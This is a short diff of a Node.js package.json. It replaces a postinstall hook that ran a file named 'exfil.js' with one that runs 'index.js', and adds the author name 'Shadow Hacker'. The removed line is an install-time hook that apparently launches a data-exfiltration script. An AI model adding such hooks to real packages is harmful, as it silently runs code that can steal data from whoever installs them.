@@ -3,6 +3,8 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "postinstall": "node exfil.js"
-  }
+    "postinstall": "node index.js"
+  },
+  "author": "Shadow Hacker",
+  "license": "MIT"
 }
